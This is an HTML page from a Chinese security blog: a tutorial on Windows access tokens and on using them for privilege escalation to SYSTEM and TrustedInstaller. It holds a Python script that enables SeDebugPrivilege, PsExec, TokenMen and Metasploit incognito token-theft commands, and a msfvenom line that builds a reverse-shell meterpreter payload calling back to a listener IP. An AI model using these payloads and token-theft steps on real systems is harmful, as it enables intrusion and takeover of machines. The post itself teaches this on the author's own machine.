@@ -1,0 +1,811 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/I.png">
+  <link rel="icon" href="/img/I.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Infernity">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="它是一个描述进程或者线程安全上下文的一个对象，包含了登陆会话的安全信息（比如各种SID）。当用户登陆时，系统创建一个访问令牌，然后以该用户身份运行的的所有进程都拥有该令牌的一个拷贝。这也就解释了A用户创建一个进程，而该进程没有B用户的权限。 两种类型的Token 授权令牌(Primary Token)，也叫做主令牌，与进程 (Process) 相关，用于交互会话登录（例如本地直接登录、rdp lo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用Windows Access Token提权">
+<meta property="og:url" content="http://example.com/2025/10/02/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Infernity&#39;s Blog">
+<meta property="og:description" content="它是一个描述进程或者线程安全上下文的一个对象，包含了登陆会话的安全信息（比如各种SID）。当用户登陆时，系统创建一个访问令牌，然后以该用户身份运行的的所有进程都拥有该令牌的一个拷贝。这也就解释了A用户创建一个进程，而该进程没有B用户的权限。 两种类型的Token 授权令牌(Primary Token)，也叫做主令牌，与进程 (Process) 相关，用于交互会话登录（例如本地直接登录、rdp lo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/toutu.png">
+<meta property="article:published_time" content="2025-10-02T06:23:35.000Z">
+<meta property="article:modified_time" content="2025-10-02T06:34:32.069Z">
+<meta property="article:author" content="Infernity">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/toutu.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>利用Windows Access Token提权 - Infernity&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Infernity&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/friends/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>friends</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background/19.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">利用Windows Access Token提权</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-02 14:23" pubdate>
+          2025年10月2日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">利用Windows Access Token提权</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>它是一个描述进程或者线程安全上下文的一个对象，包含了登陆会话的安全信息（比如各种SID）。当用户登陆时，系统创建一个访问令牌，然后以该用户身份运行的的所有进程都拥有该令牌的一个拷贝。这也就解释了A用户创建一个进程，而该进程没有B用户的权限。</p>
+<h3 id="两种类型的Token"><a href="#两种类型的Token" class="headerlink" title="两种类型的Token"></a>两种类型的Token</h3><ul>
+<li>授权令牌(Primary Token)，也叫做主令牌，与<strong>进程 (Process)</strong> 相关，用于交互会话登录（例如本地直接登录、rdp login 、psexec），代表用户的完整登录会话，用于启动新的进程。</li>
+<li>模拟令牌(Impersonation Token)，也叫做模拟令牌，与<strong>线程 (Thread)</strong> 相关，用于非交互登录（利用net use访问共享文件夹，或者wmi、winrm等等），用于一个线程临时“冒充”另一个用户的安全上下文，从而以该用户的权限访问资源。</li>
+</ul>
+<p>当用户<strong>交互式登录</strong>时（如本地登录、RDP），系统会生成一个<strong>主令牌（授权令牌）</strong> 。同时，系统会利用这个主令牌在内存中创建一个名为 <code>winlogon.exe</code> 的进程。</p>
+<p>当用户<strong>注销</strong>时，与该用户会话关联的所有进程（包括拥有主令牌的进程）<strong>都会被系统终止</strong>。因此，该用户的<strong>主令牌（授权令牌）也随之被销毁</strong>。</p>
+<p>但是，如果该用户曾经通过<strong>非交互式</strong>方式（如 <code>net use</code>、WMI、计划任务等）建立过连接，这些连接会生成<strong>模拟令牌</strong>。在某些情况下（尤其是对于像域管理员这样的高权限账户），即使用户注销，这些模拟令牌可能仍然保留在系统的内存中，而不会被立即清除，只有在重启机器后才会清除 。</p>
+<table>
+<thead>
+<tr>
+<th>特征</th>
+<th>主令牌 (Primary Token)</th>
+<th>模拟令牌 (Impersonation Token)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>关联对象</strong></td>
+<td><strong>进程</strong></td>
+<td><strong>线程</strong></td>
+</tr>
+<tr>
+<td><strong>创建场景</strong></td>
+<td>用户<strong>交互式登录</strong>（登录、RDP、RunAs）</td>
+<td>线程<strong>模拟</strong>一个客户端的安全上下文（如访问网络共享、通过WMI执行命令）</td>
+</tr>
+<tr>
+<td><strong>代表身份</strong></td>
+<td>进程的<strong>所有者</strong></td>
+<td>线程正在<strong>模拟</strong>的客户端用户</td>
+</tr>
+<tr>
+<td><strong>权限级别</strong></td>
+<td>通常具有用户的<strong>完整权限</strong></td>
+<td>权限可能被<strong>限制</strong>（取决于模拟级别）</td>
+</tr>
+<tr>
+<td><strong>生命周期</strong></td>
+<td>从登录持续到<strong>进程结束</strong>或用户<strong>注销</strong></td>
+<td>从线程开始模拟持续到<strong>线程结束</strong>或停止模拟</td>
+</tr>
+<tr>
+<td><strong>典型用途</strong></td>
+<td>启动应用程序（如打开notepad.exe）</td>
+<td>服务处理客户端请求时，临时“扮演”该客户端去访问资源</td>
+</tr>
+</tbody></table>
+<h3 id="模拟级别-Impersonation-Levels"><a href="#模拟级别-Impersonation-Levels" class="headerlink" title="模拟级别 (Impersonation Levels)"></a>模拟级别 (Impersonation Levels)</h3><p>模拟令牌有一个重要的属性叫“模拟级别”，它决定了线程使用模拟令牌的能力：</p>
+<ul>
+<li><strong>Anonymous</strong>： 模拟者无法获取客户端的身份信息。</li>
+<li><strong>Identification</strong>： 模拟者可以获取客户端的身份（如SID），但不能模拟客户端。</li>
+<li><strong>Impersonation</strong>： 模拟者可以在<strong>本地系统</strong>上代表客户端访问资源。</li>
+<li><strong>Delegation</strong>： 模拟者可以在<strong>本地和远程</strong>系统上代表客户端访问资源（权限最高）。</li>
+</ul>
+<h3 id="TOKEN的产生"><a href="#TOKEN的产生" class="headerlink" title="TOKEN的产生"></a><strong>TOKEN的产生</strong></h3><p>每个进程创建时都会根据登录会话权限由 LSA(Local Security Authority) 分配一个Token，如果在调用<code>CreateProcess</code>时显式指定了一个Token，则使用该Token；否则，新进程将默认继承其父进程的Token。</p>
+<h3 id="进程的身份标识：Luid与SID"><a href="#进程的身份标识：Luid与SID" class="headerlink" title="进程的身份标识：Luid与SID"></a><strong>进程的身份标识：Luid与SID</strong></h3><h4 id="Luid"><a href="#Luid" class="headerlink" title="Luid"></a><strong>Luid</strong></h4><p>每个特权常量字符串（Privileges）都对应一个LUID（本地标识符），使用<code>LookupPrivilegeName</code>函数将LUID转换为其对应的字符串常量，总计是36个特权，所以LUID有36个(0x24)，所有特权如下：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/secauthz/privilege-constants">特权常量</a></p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image1.png" srcset="/img/loading.gif" lazyload alt="image1"></p>
+<h4 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h4><p>SID是安全标识符，是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 SID。它用来跟踪每个账户，而且永远不会更改，即使我们更改了管理员的名字它也不会变。</p>
+<p>SID的构成如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">S-版本号-(颁发机构：Identity-Authority)-(子机构：SubAuthority)-RID<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="赋予当前进程操作令牌DEBUG权限"><a href="#赋予当前进程操作令牌DEBUG权限" class="headerlink" title="赋予当前进程操作令牌DEBUG权限"></a>赋予当前进程操作令牌DEBUG权限</h3><p>很多操作一般都需要赋予当前进程操作令牌权限：<code>SE_DEBUG_NAME</code>，然后再进行令牌操作，比如清除令牌、伪造令牌，在加载驱动的时候如果要连接驱动是需要Debug权限的，否则无法进行createFile生成驱动句柄。</p>
+<p>比如很常用的猕猴桃的<code>privilege::debug</code>，就是为了获取<code>SE_DEBUG_NAME</code>权限。</p>
+<p><strong>目标：</strong> 获取一个启用<code>SE_DEBUG_NAME</code>的CMD。</p>
+<p><strong>步骤：</strong></p>
+<ol>
+<li>获取当前进程令牌</li>
+<li>查找 <code>SeDebugPrivilege</code> 的 LUID</li>
+<li>启用 <code>SE_PRIVILEGE_ENABLED</code> 属性</li>
+</ol>
+<p><strong>思路：</strong>我们可以给当前的python进程赋予<code>SE_DEBUG_NAME</code>权限，然后起一个CMD的子进程，这样CMD就会继承python进程的权限了。</p>
+<blockquote>
+<p>下面的代码需要以管理员身份运行python</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> win32security<br><span class="hljs-keyword">import</span> win32api<br><span class="hljs-keyword">import</span> subprocess<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enable_debug_privilege</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 获取当前进程令牌</span><br>        hToken = win32security.OpenProcessToken(<br>            win32api.GetCurrentProcess(),<br>            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY<br>        )<br><br>        <span class="hljs-comment"># 获取SE_DEBUG_NAME特权LUID</span><br>        privilege_id = win32security.LookupPrivilegeValue(<span class="hljs-literal">None</span>, win32security.SE_DEBUG_NAME)<br><br>        <span class="hljs-comment"># 启用特权</span><br>        win32security.AdjustTokenPrivileges(<br>            hToken,<br>            <span class="hljs-literal">False</span>,<br>            [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)]<br>        )<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] SE_DEBUG_NAME privilege enabled successfully&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Failed to enable debug privilege: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br>enable_debug_privilege()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Starting cmd with debug privileges...&quot;</span>)<br>subprocess.Popen(<span class="hljs-string">&quot;cmd.exe&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>我们可以通过<code>whoami /priv | findstr &quot;SeDebugPrivilege&quot;</code>命令来查询<strong>运行该命令的进程的令牌</strong>。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image2.png" srcset="/img/loading.gif" lazyload alt="image2"></p>
+<p>可以看到直接以管理员开启cmd，<code>SeDebugPrivilege</code>是禁用的。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image3.png" srcset="/img/loading.gif" lazyload alt="image3"></p>
+<p>运行上述脚本后，成功开启了<code>SeDebugPrivilege</code>这个特权。</p>
+<h3 id="获取一个SYSTEM权限的CMD"><a href="#获取一个SYSTEM权限的CMD" class="headerlink" title="获取一个SYSTEM权限的CMD"></a>获取一个SYSTEM权限的CMD</h3><p>直接用微软官方提供的工具，PSTOOLS：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
+<p>以管理员身份运行一个CMD，然后输入一下命令：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PsExec<span class="hljs-selector-class">.exe</span> -s -<span class="hljs-selector-tag">i</span> cmd.exe<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image4.png" srcset="/img/loading.gif" lazyload alt="image4"></p>
+<h2 id="利用Token提权到Trustedinstaller"><a href="#利用Token提权到Trustedinstaller" class="headerlink" title="利用Token提权到Trustedinstaller"></a>利用Token提权到Trustedinstaller</h2><p>刚刚我们获得了一个system权限的CMD窗口，这样我们就能任意操作我们的系统了吗？</p>
+<p>例如在<code>C:\Windows\servicing</code>文件夹内，哪怕是system权限，我们甚至不能写一个文件进去。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image5.png" srcset="/img/loading.gif" lazyload alt="image5"></p>
+<p>又例如在<code>C:\Windows\System32</code>文件夹内，要删除这个图片文件，提示说 “你需要TrustedInstaller提供的权限才能对此文件进行更改”。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image6.png" srcset="/img/loading.gif" lazyload alt="image6"></p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image7.png" srcset="/img/loading.gif" lazyload alt="image7"></p>
+<p>在属性里，也只有TrustedInstaller权限才能对其进行修改，其他只有读取权限。</p>
+<h3 id="什么是Trustedinstaller权限？"><a href="#什么是Trustedinstaller权限？" class="headerlink" title="什么是Trustedinstaller权限？"></a>什么是Trustedinstaller权限？</h3><p><strong>TrustedInstaller权限</strong>，准确来说，是Windows系统中的一个<strong>安全主体</strong>。你可以把它理解为一个特殊的“用户账户”或“管理员之上的管理员”。</p>
+<p>它的核心作用是：<strong>作为Windows文件、注册表键值等系统资源的“所有者”和最高权限控制者。</strong></p>
+<p>在Windows Vista及之后的版本中，微软引入了它来替代旧系统中无处不在的<code>SYSTEM</code>权限，旨在实现<strong>最小权限原则</strong>，进一步提高系统的安全性。</p>
+<h3 id="如何获取Trustedinstaller权限？"><a href="#如何获取Trustedinstaller权限？" class="headerlink" title="如何获取Trustedinstaller权限？"></a>如何获取Trustedinstaller权限？</h3><p>原理：启动TrustedInstaller服务会启动进程TrustedInstaller.exe，位置为<code>C:\Windows\servicing\TrustedInstaller.exe</code>，然后与上面提到的token一样，借用TrustedInstaller.exe的token创建子进程，这样子进程就有了TrustedInstaller权限。</p>
+<h4 id="方法一：TokenMen"><a href="#方法一：TokenMen" class="headerlink" title="方法一：TokenMen"></a>方法一：TokenMen</h4><p><a target="_blank" rel="noopener" href="https://github.com/Yair-Men/TokenMen/releases/download/TokenMen_x64-v2/TokenMen.exe">https://github.com/Yair-Men/TokenMen/releases/download/TokenMen_x64-v2/TokenMen.exe</a></p>
+<p>在SYSTEM的CMD中：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">sc <span class="hljs-built_in">start</span> TrustedInstaller<br>TokenMen.exe &lt;刚刚运行TrustedInstaller服务的pid进程号&gt; <span class="hljs-built_in">cmd</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image8.png" srcset="/img/loading.gif" lazyload alt="image8"></p>
+<p>然后弹出一个新的cmd窗口，使用<code>whoami /all</code>可以看到我们已经属于TrustedInstaller组了。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image9.png" srcset="/img/loading.gif" lazyload alt="image9"></p>
+<p>测试<code>echo 1&gt;1.txt</code></p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image10.png" srcset="/img/loading.gif" lazyload alt="image10"></p>
+<p>可以看到刚刚不能写的目录，现在可以写了。这个文件除了TrustedInstaller组以外的用户都无权修改。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image11.png" srcset="/img/loading.gif" lazyload alt="image11"></p>
+<h4 id="方法二：使用MSF中的incognito"><a href="#方法二：使用MSF中的incognito" class="headerlink" title="方法二：使用MSF中的incognito"></a>方法二：使用MSF中的incognito</h4><p>这边先用MSF拿一个本机的shell。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image12.png" srcset="/img/loading.gif" lazyload alt="image12"></p>
+<p>先生成一个木马：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.25.32.227 LPORT=44444 -f exe -o test.exe<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image13.png" srcset="/img/loading.gif" lazyload alt="image13"></p>
+<p>然后在本机以<strong>管理员身份</strong>运行木马。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image14.png" srcset="/img/loading.gif" lazyload alt="image14"></p>
+<p>成功链接。</p>
+<p><strong>在Metasploit中，可使用incognito实现token窃取，常用命令如下：</strong></p>
+<ul>
+<li>加载incognito：<code>load incognito</code></li>
+<li>列举token：<code>list_tokens -u</code></li>
+<li>查看当前token：<code>getuid</code></li>
+<li>提示至system权限：<code>getsystem</code></li>
+<li>token窃取：<code>impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</code></li>
+<li>从进程窃取：<code>steal_token &lt;进程pid&gt;</code></li>
+<li>返回之前token：<code>rev2self</code> or <code>drop_token</code></li>
+</ul>
+<p>执行<code>getsystem</code>获得system权限：</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image15.png" srcset="/img/loading.gif" lazyload alt="image15"></p>
+<p>或者执行<code>impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</code>将权限切换至system。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image16.png" srcset="/img/loading.gif" lazyload alt="image16"></p>
+<p>在获取system权限后，根据相同的思路，窃取TrustedInstaller进程的token，然后提权。</p>
+<p>首先使用ps命令获取TrustedInstaller进程的PID。</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image17.png" srcset="/img/loading.gif" lazyload alt="image17"></p>
+<p>然后窃取token：<code>steal_token 16312</code></p>
+<p><img src="/img/%E5%88%A9%E7%94%A8WindowsAccessToken%E6%8F%90%E6%9D%83/image18.png" srcset="/img/loading.gif" lazyload alt="image18"></p>
+<p>可以看到成功提到TrustedInstaller了。</p>
+<p>其实方法还有很多，但核心思路就是令牌窃取，<strong>利用别的进程的token创建子进程，这样子进程就有了对应进程的权限。</strong></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Windows/" class="category-chain-item">Windows</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Windows/" class="print-no-link">#Windows</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>利用Windows Access Token提权</div>
+      <div>http://example.com/2025/10/02/利用WindowsAccessToken提权/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Infernity</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/16/Python-Unicode%E5%AD%97%E7%AC%A6%E6%9C%BA%E5%88%B6%E8%A7%A3%E6%9E%90/" title="Python_Unicode字符机制解析">
+                        <span class="hidden-mobile">Python_Unicode字符机制解析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
